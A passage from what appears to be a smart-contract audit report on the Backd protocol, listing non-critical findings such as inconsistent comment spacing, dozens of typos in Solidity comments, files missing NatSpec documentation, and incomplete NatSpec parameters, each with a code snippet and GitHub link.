spacing in comments\r\nSome lines use `// x` and some use `//x`. The instances below point out the usages that don't follow the majority, within each file\r\n\r\n```solidity\r\nFile: contracts/utils/CvxMintAmount.sol   #1\r\n\r\n8     uint256 private constant _CLIFF_COUNT = 1000; // 1,000 cliffs\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/CvxMintAmount.sol#L8\r\n\r\n```solidity\r\nFile: contracts/utils/CvxMintAmount.sol   #2\r\n\r\n11         IERC20(address(0x4e3FBD56CD56c3e72c1403e103b45Db9da5B9D2B)); // CVX Token\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/CvxMintAmount.sol#L11\r\n\r\n### 9. Typos\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #1\r\n\r\n85      * @notice Returns the collaterization ratio of the user.\r\n```\r\ncollaterization\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L85\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #2\r\n\r\n86      *         A result of 1.5 (x1e18) means that the user has a 150% collaterization ratio.\r\n```\r\ncollaterization\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L86\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #3\r\n\r\n103      * @return The amount of debt that was repayed in the underlying.\r\n```\r\nrepayed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L103\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #4\r\n\r\n157      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L157\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpActionFeeHandler.sol   #5\r\n\r\n202      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpActionFeeHandler.sol#L202\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #6\r\n\r\n396      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L396\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #7\r\n\r\n737      * @dev Setting the addres to 0 means that the protocol will no longer be supported.\r\n```\r\naddres\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L737\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #8\r\n\r\n859      *                      If this is greater than `requiredAmount` more tokens will be locked.\r\n```\r\nrequiredAmount - no such variable\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpAction.sol#L859\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpKeeperHelper.sol   #9\r\n\r\n156      * @param length The length to trucate the list of topups to.\r\n```\r\ntrucate\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/TopUpKeeperHelper.sol#L156\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #10\r\n\r\n297      * @dev Does not revert if the pool deos not exist\r\n```\r\ndeos\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L297\r\n\r\n```solidity\r\nFile: contracts/AddressProvider.sol   #11\r\n\r\n308      * @dev Reverts if the pool deos not exist\r\n```\r\ndeos\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/AddressProvider.sol#L308\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #12\r\n\r\n131      * @notice Processes exipred locks.\r\n```\r\nexipred\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L131\r\n\r\n```solidity\r\nFile: contracts/CvxCrvRewardsLocker.sol   #13\r\n\r\n254                 // Swap CRV for cxvCRV and stake\r\n```\r\ncxvCRV - should be cvxCRV\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/CvxCrvRewardsLocker.sol#L254\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol   #14\r\n\r\n62      * @return Aamount of tokens burned.\r\n```\r\nAamount\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L62\r\n\r\n```solidity\r\nFile: contracts/LpToken.sol   #15\r\n\r\n79      * @dev We notify that LP tokens have been transfered\r\n```\r\ntransfered\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/LpToken.sol#L79\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #16\r\n\r\n185      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L185\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #17\r\n\r\n214      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L214\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #18\r\n\r\n243      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L243\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #19\r\n\r\n272      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L272\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #20\r\n\r\n304      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L304\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #21\r\n\r\n352      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L352\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #22\r\n\r\n644      * @notice Retuns if the pool has an active deposit limit\r\n```\r\nRetuns\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L644\r\n\r\n```solidity\r\nFile: contracts/pool/LiquidityPool.sol   #23\r\n\r\n804      * @dev Overriden for testing\r\n```\r\nOverriden\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/LiquidityPool.sol#L804\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #24\r\n\r\n136      * @param _underlyingAmount Amount of underlying that is being widthdrawn from Curve Pool.\r\n```\r\nwidthdrawn\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L136\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #25\r\n\r\n154      * @dev Uses get_virtual_price which is less suceptible to manipulation.\r\n```\r\nsuceptible\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L154\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdEthCvx.sol   #26\r\n\r\n165      * @dev Uses get_virtual_price which is less suceptible to manipulation.\r\n```\r\nsuceptible\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdEthCvx.sol#L165\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #27\r\n\r\n27     event SetHopImbalanceToleranceIn(uint256 value); // Emitted after a succuessful setting of hop imbalance tolerance in\r\n```\r\nsuccuessful\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L27\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #28\r\n\r\n28     event SetHopImbalanceToleranceOut(uint256 value); // Emitted after a succuessful setting of hop imbalance tolerance out\r\n```\r\nsuccuessful\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L28\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #29\r\n\r\n79      * @param _hopImbalanceToleranceIn New hop imbalance tolarance in.\r\n```\r\ntolarance\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L79\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #30\r\n\r\n95      * @param _hopImbalanceToleranceOut New hop imbalance tolarance out.\r\n```\r\ntolarance\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L95\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #31\r\n\r\n248      * @param _hopLpAmount Amount of Hop LP that is being widthdrawn from Curve Pool.\r\n```\r\nwidthdrawn\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L248\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #32\r\n\r\n258      * @return The mininum Hop LP balance to accept.\r\n```\r\nmininum\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L258\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #33\r\n\r\n282      * @param _underlyingAmount Amount of underlying that is being widthdrawn from Curve Hop Pool.\r\n```\r\nwidthdrawn\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L282\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #34\r\n\r\n295      * @return The mininum underlying balance to accept.\r\n```\r\nmininum\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L295\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #35\r\n\r\n304      * @dev Uses get_virtual_price which is less suceptible to manipulation.\r\n```\r\nsuceptible\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L304\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #36\r\n\r\n315      * @dev Uses get_virtual_price which is less suceptible to manipulation.\r\n```\r\nsuceptible\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L315\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #37\r\n\r\n326      * @dev Uses get_virtual_price which is less suceptible to manipulation.\r\n```\r\nsuceptible\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L326\r\n\r\n```solidity\r\nFile: contracts/strategies/BkdTriHopCvx.sol   #38\r\n\r\n340      * @dev Uses get_virtual_price which is less suceptible to manipulation.\r\n```\r\nsuceptible\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/BkdTriHopCvx.sol#L340\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #39\r\n\r\n61     event Deposit(); // Emitted after a successfull deposit\r\n```\r\nsuccessfull\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L61\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #40\r\n\r\n63     event WithdrawAll(uint256 amount); // Emitted after successfully withdrwaing all\r\n```\r\nwithdrwaing\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L63\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #41\r\n\r\n65     event SetCommunityReserve(address reserve); // Emitted after a succuessful setting of reserve\r\n```\r\nsuccuessful\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L65\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #42\r\n\r\n66     event SetCrvCommunityReserveShare(uint256 value); // Emitted after a succuessful setting of CRV Community Reserve Share\r\n```\r\nsuccuessful\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L66\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #43\r\n\r\n67     event SetCvxCommunityReserveShare(uint256 value); // Emitted after a succuessful setting of CVX Community Reserve Share\r\n```\r\nsuccuessful\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L67\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #44\r\n\r\n68     event SetImbalanceToleranceIn(uint256 value); // Emitted after a succuessful setting of imbalance tolerance in\r\n```\r\nsuccuessful\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L68\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #45\r\n\r\n69     event SetImbalanceToleranceOut(uint256 value); // Emitted after a succuessful setting of imbalance tolerance out\r\n```\r\nsuccuessful\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L69\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #46\r\n\r\n70     event SetStrategist(address strategist); // Emitted after a succuessful setting of strategist\r\n```\r\nsuccuessful\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L70\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #47\r\n\r\n175      * @notice Set the address of the communit reserve.\r\n```\r\ncommunit\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L175\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #48\r\n\r\n224      * @param imbalanceToleranceIn_ New imbalance tolarance in.\r\n```\r\ntolarance\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L224\r\n\r\n```solidity\r\nFile: contracts/strategies/ConvexStrategyBase.sol   #49\r\n\r\n240      * @param imbalanceToleranceOut_ New imbalance tolarance out.\r\n```\r\ntolarance\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/ConvexStrategyBase.sol#L240\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #50\r\n\r\n34     event SetSlippageTolerance(uint256 value); // Emitted after a succuessful setting of slippage tolerance\r\n```\r\nsuccuessful\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L34\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #51\r\n\r\n35     event SetCurvePool(address token, address curvePool); // Emitted after a succuessful setting of a Curve Pool\r\n```\r\nsuccuessful\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L35\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #52\r\n\r\n36     event SetSwapViaUniswap(address token, bool swapViaUniswap); // Emitted after a succuessful setting of swap via Uniswap\r\n```\r\nsuccuessful\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L36\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #53\r\n\r\n292      * @dev Returns the Curve Pool coin indicies for a given Token.\r\n```\r\nindicies\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L292\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #54\r\n\r\n293      * @param curvePool_ The Curve Pool to return the indicies for.\r\n```\r\nindicies\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L293\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #55\r\n\r\n294      * @param token_ The Token to get the indicies for.\r\n```\r\nindicies\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L294\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #56\r\n\r\n307      * @dev Returns the minimum amount of Token to recieve from swap.\r\n```\r\nrecieve\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L307\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #57\r\n\r\n310      * @return minAmountOut The minimum amount of Token to recieve from swap.\r\n```\r\nrecieve\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L310\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #58\r\n\r\n324      * @dev Returns the minimum amount of WETH to recieve from swap.\r\n```\r\nrecieve\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L324\r\n\r\n```solidity\r\nFile: contracts/strategies/StrategySwapper.sol   #59\r\n\r\n327      * @return minAmountOut The minimum amount of WETH to recieve from swap.\r\n```\r\nrecieve\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/strategies/StrategySwapper.sol#L327\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #60\r\n\r\n10  * callers should make sure to have the proper checks in palce\r\n```\r\npalce\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L10\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #61\r\n\r\n34      * @notice Prepares an uint256 that should be commited to the contract\r\n```\r\ncommited\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L34\r\n\r\n```solidity\r\nFile: contracts/utils/Preparable.sol   #62\r\n\r\n58      * @notice Prepares an address that should be commited to the contract\r\n```\r\ncommited\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/Preparable.sol#L58\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #63\r\n\r\n218      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L218\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #64\r\n\r\n270      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L270\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #65\r\n\r\n293      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L293\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #66\r\n\r\n317      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L317\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #67\r\n\r\n348      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L348\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #68\r\n\r\n373      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L373\r\n\r\n```solidity\r\nFile: contracts/vault/Vault.sol   #69\r\n\r\n398      * @dev Needs to be called after the update was prepraed. Fails if called before time delay is met.\r\n```\r\nprepraed\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Vault.sol#L398\r\n\r\n### 10. File is missing NatSpec\r\n\r\n```solidity\r\nFile: contracts/access/Authorization.sol (various lines)   #1\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/Authorization.sol\r\n\r\n```solidity\r\nFile: contracts/access/RoleManager.sol (various lines)   #2\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/access/RoleManager.sol\r\n\r\n```solidity\r\nFile: contracts/oracles/ChainlinkUsdWrapper.sol (various lines)   #3\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/ChainlinkUsdWrapper.sol\r\n\r\n```solidity\r\nFile: contracts/oracles/OracleProviderExtensions.sol (various lines)   #4\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/oracles/OracleProviderExtensions.sol\r\n\r\n```solidity\r\nFile: contracts/pool/Erc20Pool.sol (various lines)   #5\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/Erc20Pool.sol\r\n\r\n```solidity\r\nFile: contracts/pool/EthPool.sol (various lines)   #6\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/pool/EthPool.sol\r\n\r\n```solidity\r\nFile: contracts/utils/CvxMintAmount.sol (various lines)   #7\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/utils/CvxMintAmount.sol\r\n\r\n```solidity\r\nFile: contracts/vault/Erc20Vault.sol (various lines)   #8\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/Erc20Vault.sol\r\n\r\n```solidity\r\nFile: contracts/vault/EthVault.sol (various lines)   #9\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/vault/EthVault.sol\r\n\r\n```solidity\r\nFile: libraries/AddressProviderMeta.sol (various lines)   #10\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/AddressProviderMeta.sol\r\n\r\n```solidity\r\nFile: libraries/Errors.sol (various lines)   #11\r\n\r\n```\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/libraries/Errors.sol\r\n\r\n### 11. NatSpec is incomplete\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/AaveHandler.sol   #1\r\n\r\n29     /**\r\n30      * @notice Executes the top-up of a position.\r\n31      * @param account Account holding the position.\r\n32      * @param underlying Underlying for tup-up.\r\n33      * @param amount Amount to top-up by.\r\n34      * @return `true` if successful.\r\n35      */\r\n36     function topUp(\r\n37         bytes32 account,\r\n38         address underlying,\r\n39         uint256 amount,\r\n40         bytes memory extra\r\n41     ) external override returns (bool) {\r\n```\r\nMissing: `@param extra`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/AaveHandler.sol#L29-L41\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #2\r\n\r\n43     /**\r\n44      * @notice Executes the top-up of a position.\r\n45      * @param account Account holding the position.\r\n46      * @param underlying Underlying for tup-up.\r\n47      * @param amount Amount to top-up by.\r\n48      * @return `true` if successful.\r\n49      */\r\n50     function topUp(\r\n51         bytes32 account,\r\n52         address underlying,\r\n53         uint256 amount,\r\n54         bytes memory extra\r\n55     ) external override returns (bool) {\r\n```\r\nMissing: `@param extra`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L43-L55\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #3\r\n\r\n84     /**\r\n85      * @notice Returns the collaterization ratio of the user.\r\n86      *         A result of 1.5 (x1e18) means that the user has a 150% collaterization ratio.\r\n87      * @param account account for which to check the factor.\r\n88      * @return User factor.\r\n89      */\r\n90     function getUserFactor(bytes32 account, bytes memory) external view override returns (uint256) {\r\n```\r\nMissing: `@param null`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L84-L90\r\n\r\n```solidity\r\nFile: contracts/actions/topup/handlers/CompoundHandler.sol   #4\r\n\r\n98     /**\r\n99      * @notice Repays any existing debt for the given underlying.\r\n100      * @param account Account for which to repay the debt.\r\n101      * @param underlying The underlying token to repay the debt for.\r\n102      * @param maximum The maximum amount of debt to repay.\r\n103      * @return The amount of debt that was repayed in the underlying.\r\n104      */\r\n105     function _repayAnyDebt(\r\n106         address account,\r\n107         address underlying,\r\n108         uint256 maximum,\r\n109         CToken ctoken\r\n110     ) internal returns (uint256) {\r\n```\r\nMissing: `@param ctoken`\r\nhttps://github.com/code-423n4/2022-04-backd/blob/c856714a50437cb33240a5964b63687c9876275b/backd/contracts/actions/topup/handlers/CompoundHandler.sol#L98-L110\r\n\r\n```solidity\r\nFile: contracts/actions/topup/TopUpAction.sol   #5\r\n\r\n201      * @param record containing the data for the position to register\r\n202      */\r\n203     function register(\r\n204         bytes32 account,\r\n205         bytes32 protocol,\r\n206         uint128 depositAmount,\r\n207         Record memory record\r\n208     ) external payable returns (bool) {\r\n```\r\nMissing: 